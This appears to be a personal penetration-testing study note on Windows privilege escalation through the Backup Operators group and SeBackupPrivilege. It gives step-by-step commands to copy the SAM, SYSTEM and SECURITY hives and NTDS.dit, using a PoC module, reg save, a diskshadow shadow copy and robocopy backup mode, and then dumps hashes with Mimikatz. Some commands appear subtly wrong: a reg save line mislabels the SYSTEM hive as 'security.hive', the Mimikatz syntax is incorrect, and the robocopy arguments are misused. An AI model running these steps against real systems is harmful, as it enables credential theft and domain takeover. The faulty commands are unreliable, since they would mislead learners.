---
created: 2026-07-21
tags:
  - Windows
  - Windows_PrivEsc
status: substantial
---
## `Backup Operators`


![[Windows groups#`Backup Operators`]]

## `SeBackupPrivilege`

![[Windows privileges#`SeBackupPrivilege`]]

## `Backup Operators` in privilege escalation

- Members of the `Backup Operators` group receive **`SeBackupPrivilege`** and `SeRestorePrivilege`, which allows them to **read and restore any file on the system**, **regardless of file ownership and permissions** — when using the Windows backup and restore APIs.
- The most common abuse is **reading sensitive files** that are normally accessible only by `SYSTEM` or `Administrator`, such as:
	- `C:\Windows\System32\config\SAM`
	- `C:\Windows\System32\config\SYSTEM`
	- `C:\Windows\System32\config\SECURITY`
	- `C:\Windows\NTDS\NTDS.dit` (Domain Controllers)
- These files contain password hashes or other secrets that can often be used to obtain administrative access.

>[!important] `SeBackupPrivilege` **does not bypass NTFS permissions for normal file operations.** 
>- Commands like `copy`, `type`, `cat`, `Get-Content` still perform normal access checks and therefore **ignore `SeBackupPrivilege`**.
>- `SeBackupPriivlege` only takes effect in operations explicitly designed for backup, such `robocopy /B`, `diskshadow`, `reg save`, and `SeBackupPrivilege.ps1` exploit. 

- Check whether the current user belongs to **`Backup Operators`**:

```powershell
whoami /group
```

```powershell
net user %USERNAME%
```

- Verify the required privileges (look for `SeBackupPrivilege` and `SeRestorePrivilege` in the output):

```powershell
whoami /priv
```

- Initially these privileges are often **`Disabled`**, but most of the time they are enabled by applications when needed.

## Accessing protected files using `SeBackupPrivilege`
### Using `SeBackupPrivilege.ps1` PoC

 - Fetch [`SeBackupPrivilege`](https://github.com/giuliano108/SeBackupPrivilege) PoC:

```powershell
git clone https://github.com/giuliano108/SeBackupPrivilege.git 
```
```powershell
cd SeBackupPrivilege
```

1. **Import the modules**:

```powershell
Import-Module .\SeBackupPrivilegeUtils.dll
```
```powershell
Import-Module .\SeBackupPrivilegeCmdLets.dll
```

2. **Enable the privilege**:

```powershell
Set-SeBackupPrivilege
```

3. **Verify**:

```bash
Get-SeBackupPrivilege
```

4. **Copy protected files using the provided `Copy-FileSeBackupPrivilege` cmdlet**:

```powershell
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SAM C:\Temp\SAM
```

```powershell
Copy-FileSeBackupPrivilege C:\Windows\System32\config\SYSTEM C:\Temp\SYSTEM
```

- Once copied, the new files belong to you and can be accessed normally.

### Using `reg save`

- Registry hives can be backed up directly using [`reg save`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/reg-save):

```powershell
reg save HKLM\SAM C:\Temp\sam.hive
```

```powershell
reg save HKLM\SYSTEM C:\Temp\system.hive
```

```powershell
reg save HKLM\SYSTEM C:\Temp\security.hive
```

- Because `reg save` performs a **backup operation**, Windows honors `SeBackupPrivilege`.
- You can then copy the files to your attacker machine. 

> [!note] The `SYSTEM` hive contains the boot key used to decrypt password hashes stored inside `SAM`, so both hives are needed.

>[!tip]+
> - To extract password hashes, you can use Mimikatz:
> 
> ```powershell
> sekurlsa::samdump::local C:\Windows\Temp\sam.hive C:\Windows\Temp\system.hive
> ```

### Copying `NTDS.dit` using `diskshadow`

- On a Domain Controller, password hashes are stored in `C:\Windows\NTDS\NTDS.dit`. The file is locked while Active Directory is running.
- To get its copy, you can create a Volume Shadow Copy of the `C:` drive using [`diskshadow`](https://docs.microsoft.com/en-us/windows-server/administration/windows-commands/diskshadow):

```powershell
diskshadow.exe
```

```powershell
DISKSHADOW> set verbose on
DISKSHADOW> set metadata C:\Windows\Temp\meta.cab
DISKSHADOW> set context clientaccessible
DISKSHADOW> set context persistent
DISKSHADOW> begin backup
DISKSHADOW> add volume C: alias cdrive
DISKSHADOW> create
DISKSHADOW> expose %cdrive% E:
DISKSHADOW> end backup
DISKSHADOW> exit
```

>[!note]- Command breakdown
> 
> - `set verbose on` -> Enables verbose output.
> - `set metadata C:\Windows\Temp\meta.cab` -> Specifies where `diskshadow` should save backup metadata; the `.cab` file contains information about the backup session and can be used during restore operations. 
> - `set context clientaccessible` -> Sets the VSS context to create a snapshot intended for client access; affects how VSS providers and writers treat the snapshot.
> - `set context persistent` -> Makes the shadow copy persistent so it remains after the `diskshadow` session ends (rather than being automatically deleted when the program exits).
> - `begin backup` -> Starts a VSS backup session.
> - `add volume C: alias cdrive` -> Adds the `C:` volume to the backup set and assigns it the alias `cdrive`, which can later be referenced as `%cdrive%`.
> - `create` -> Creates the actual shadow copy. VSS coordinates with applications and the filesystem to produce a consistent snapshot.
> - `expose %cdrive% E:` -> Mounts (exposes) the newly created shadow copy as drive `E:` so its contents can be browsed like a normal drive. The original `C:` volume remains unchanged.
> - `end backup` -> Ends the VSS backup session and notifies VSS writers that the backup operation is complete.
> - `exit` -> Exits the `diskshadow` utility.

- A snapshot is now available as `E:\`; it contains a copy of the filesystem that is no longer locked. You can freely access `NTDS.dit` and extract credentials from it.
### Using `robocopy /B`

- [`robocopy`](https://learn.microsoft.com/en-us/windows-server/administration/windows-commands/robocopy) supports **Backup Mode** (`/B`).

```powershell
robocopy /B C:\Windows\System32\config\SAM C:\Temp sam.hive
```

```powershell
robocopy /B C:\Windows\System32\config\SYSTEM C:\Temp system.hive
```

```powershell
robocopy /B C:\Windows\System32\config\SECURITY C:\Temp security.hive
```

- Useful options:

| Option     | Description                                        |
| ---------- | -------------------------------------------------- |
| `/B`       | Backup mode (uses `SeBackupPrivilege`).            |
| `/ZB`      | Use restartable mode; if denied, fallback to `/B`. |
| `/COPYALL` | Copy all metadata including ACLs.                  |
| `/SEC`     | Preserve security information.                     |
>[!note] `robocopy /ZB` first tries normal copy, and if denied, switches to backup mode.
## References and further reading

- [`Back up files and directories - security policy setting — Microsoft Learn`](https://learn.microsoft.com/en-us/previous-versions/windows/it-pro/windows-10/security/threat-protection/security-policy-settings/back-up-files-and-directories)
- [`CreateFileA function — Microsoft Learn`](https://learn.microsoft.com/en-us/windows/win32/api/fileapi/nf-fileapi-createfilea)
- [`Backup Operators — OSCP-CPTS NOTES`](https://notes.dollarboysushil.com/windows-privilege-escalation/group-privileges/backup-operators)